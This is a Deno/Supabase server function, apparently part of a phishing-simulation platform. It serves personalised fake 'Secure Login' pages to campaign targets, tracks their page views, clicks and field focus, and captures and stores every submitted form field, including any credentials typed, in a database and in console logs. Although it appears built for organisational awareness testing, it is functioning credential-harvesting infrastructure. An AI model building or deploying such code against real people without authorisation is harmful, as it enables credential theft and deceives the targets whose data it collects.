
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.50.0';

const supabase = createClient(
  Deno.env.get('SUPABASE_URL') ?? '',
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
);

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TrackingData {
  campaignId: string;
  targetEmail: string;
  trackingId: string;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const trackingId = url.searchParams.get('t');
    const action = url.searchParams.get('action') || 'view';

    if (!trackingId) {
      console.error('Missing tracking ID');
      return new Response('Invalid request - missing tracking parameters', { 
        status: 400,
        headers: { 'Content-Type': 'text/html' }
      });
    }

    console.log(`Processing request - Tracking ID: ${trackingId}, Action: ${action}`);

    // Parse tracking data
    const trackingData = parseTrackingId(trackingId);
    if (!trackingData) {
      console.error('Invalid tracking ID format:', trackingId);
      return createErrorPage('Invalid or expired link');
    }

    // Verify campaign exists and is active
    const { data: campaign, error: campaignError } = await supabase
      .from('campaigns')
      .select(`
        *,
        phishing_page:phishing_pages(*)
      `)
      .eq('id', trackingData.campaignId)
      .single();

    if (campaignError || !campaign) {
      console.error('Campaign not found:', campaignError);
      return createErrorPage('Campaign not found or no longer active');
    }

    if (campaign.status !== 'in_progress') {
      console.error('Campaign not active:', campaign.status);
      return createErrorPage('This campaign is no longer active');
    }

    if (!campaign.phishing_page) {
      console.error('No phishing page configured for campaign:', trackingData.campaignId);
      return createErrorPage('Page not available');
    }

    // Verify target exists
    const { data: target, error: targetError } = await supabase
      .from('targets')
      .select('*')
      .eq('email', trackingData.targetEmail)
      .single();

    if (targetError || !target) {
      console.error('Target not found:', targetError);
      return createErrorPage('Invalid recipient');
    }

    // Track the page access
    await trackPageAccess(trackingData, req, action);

    // Handle form submission
    if (req.method === 'POST' && action === 'submit') {
      return await handleFormSubmission(req, trackingData);
    }

    // Render and serve the phishing page
    const renderedPage = await renderPhishingPage(
      campaign.phishing_page,
      trackingData,
      target
    );

    console.log(`Successfully served phishing page for campaign: ${trackingData.campaignId}`);

    return new Response(renderedPage, {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        ...corsHeaders
      }
    });

  } catch (error) {
    console.error('Error serving phishing page:', error);
    return createErrorPage('An error occurred while loading the page');
  }
});

function parseTrackingId(trackingId: string): TrackingData | null {
  try {
    // Decode base64 tracking ID
    const decoded = atob(trackingId);
    const parts = decoded.split('|');
    
    if (parts.length !== 3) {
      return null;
    }

    return {
      campaignId: parts[0],
      targetEmail: parts[1],
      trackingId: parts[2]
    };
  } catch (error) {
    console.error('Error parsing tracking ID:', error);
    return null;
  }
}

async function trackPageAccess(trackingData: TrackingData, req: Request, action: string) {
  try {
    const userAgent = req.headers.get('user-agent') || '';
    const ipAddress = req.headers.get('x-forwarded-for') || 
                     req.headers.get('x-real-ip') || 
                     'unknown';

    // Determine the tracking field based on action
    let updateField = 'clicked_at';
    if (action === 'submit') {
      updateField = 'data_submitted_at';
    }

    const updateData: any = {
      [updateField]: new Date().toISOString(),
      user_agent: userAgent,
      ip_address: ipAddress,
      additional_data: {
        tracking_id: trackingData.trackingId,
        action: action,
        timestamp: new Date().toISOString()
      }
    };

    // Upsert campaign metrics
    const { error } = await supabase
      .from('campaign_metrics')
      .upsert(
        {
          campaign_id: trackingData.campaignId,
          target_email: trackingData.targetEmail,
          ...updateData
        },
        {
          onConflict: 'campaign_id,target_email'
        }
      );

    if (error) {
      console.error('Error tracking page access:', error);
    } else {
      console.log(`Tracked ${action} for campaign ${trackingData.campaignId}, target ${trackingData.targetEmail}`);
    }
  } catch (error) {
    console.error('Error in trackPageAccess:', error);
  }
}

async function handleFormSubmission(req: Request, trackingData: TrackingData): Promise<Response> {
  try {
    const formData = await req.formData();
    const submittedData: Record<string, string> = {};

    // Extract form data
    for (const [key, value] of formData.entries()) {
      if (typeof value === 'string') {
        submittedData[key] = value;
      }
    }

    console.log('Form submission data:', submittedData);

    // Track the form submission
    await trackPageAccess(trackingData, req, 'submit');

    // Store the submitted data
    const { error } = await supabase
      .from('campaign_metrics')
      .update({
        additional_data: {
          tracking_id: trackingData.trackingId,
          submitted_data: submittedData,
          submission_timestamp: new Date().toISOString()
        }
      })
      .eq('campaign_id', trackingData.campaignId)
      .eq('target_email', trackingData.targetEmail);

    if (error) {
      console.error('Error storing form submission:', error);
    }

    // Return success page or redirect
    return new Response(createSuccessPage(), {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        ...corsHeaders
      }
    });

  } catch (error) {
    console.error('Error handling form submission:', error);
    return createErrorPage('Error processing form submission');
  }
}

async function renderPhishingPage(phishingPage: any, trackingData: TrackingData, target: any): Promise<string> {
  try {
    let htmlContent = phishingPage.html_content || '';
    const cssContent = phishingPage.css_content || '';
    const jsContent = phishingPage.js_content || '';

    // Replace placeholders with actual target data
    htmlContent = replacePlaceholders(htmlContent, target);

    // Inject tracking and form handling
    const trackingScript = generateTrackingScript(trackingData);
    const formHandler = generateFormHandler(trackingData);

    // Construct the complete page
    const completePage = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        ${cssContent}
        
        /* Additional security styling */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .error {
            color: #d32f2f;
            margin: 10px 0;
            padding: 10px;
            background: #ffebee;
            border-radius: 4px;
            display: none;
        }
    </style>
</head>
<body>
    ${htmlContent}
    
    <div class="loading" id="loading">
        <p>Processing your request...</p>
    </div>
    
    <div class="error" id="error"></div>
    
    <script>
        ${jsContent}
        
        ${trackingScript}
        
        ${formHandler}
    </script>
</body>
</html>`;

    return completePage;

  } catch (error) {
    console.error('Error rendering phishing page:', error);
    throw error;
  }
}

function replacePlaceholders(content: string, target: any): string {
  return content
    .replace(/\{\{first_name\}\}/g, target.first_name || '')
    .replace(/\{\{last_name\}\}/g, target.last_name || '')
    .replace(/\{\{email\}\}/g, target.email || '')
    .replace(/\{\{department\}\}/g, target.department || '')
    .replace(/\{\{position\}\}/g, target.position || '')
    .replace(/\{\{phone\}\}/g, target.phone || '');
}

function generateTrackingScript(trackingData: TrackingData): string {
  return `
    // Tracking functionality
    (function() {
      // Track page view
      fetch(window.location.href + '&action=view', {
        method: 'GET',
        mode: 'no-cors'
      }).catch(() => {});
      
      // Track clicks
      document.addEventListener('click', function(e) {
        if (e.target.tagName === 'A' || e.target.tagName === 'BUTTON') {
          fetch(window.location.href + '&action=click', {
            method: 'GET',
            mode: 'no-cors'
          }).catch(() => {});
        }
      });
      
      // Track form focus
      document.addEventListener('focusin', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
          fetch(window.location.href + '&action=focus', {
            method: 'GET',
            mode: 'no-cors'
          }).catch(() => {});
        }
      });
    })();
  `;
}

function generateFormHandler(trackingData: TrackingData): string {
  return `
    // Form submission handler
    document.addEventListener('DOMContentLoaded', function() {
      const forms = document.querySelectorAll('form');
      
      forms.forEach(function(form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          
          const loading = document.getElementById('loading');
          const error = document.getElementById('error');
          
          if (loading) loading.style.display = 'block';
          if (error) error.style.display = 'none';
          
          // Submit form data
          const formData = new FormData(form);
          
          fetch(window.location.href + '&action=submit', {
            method: 'POST',
            body: formData
          })
          .then(response => response.text())
          .then(html => {
            document.open();
            document.write(html);
            document.close();
          })
          .catch(err => {
            console.error('Submission error:', err);
            if (loading) loading.style.display = 'none';
            if (error) {
              error.textContent = 'An error occurred. Please try again.';
              error.style.display = 'block';
            }
          });
        });
      });
    });
  `;
}

function createErrorPage(message: string): Response {
  const errorHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Not Available</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Page Not Available</h1>
        <p>${message}</p>
        <p>If you believe this is an error, please contact your system administrator.</p>
    </div>
</body>
</html>`;

  return new Response(errorHtml, {
    status: 404,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      ...corsHeaders
    }
  });
}

function createSuccessPage(): string {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 {
            color: #4caf50;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Thank You</h1>
        <p>Your information has been processed successfully.</p>
        <p>You may now close this window.</p>
    </div>
</body>
</html>`;
}
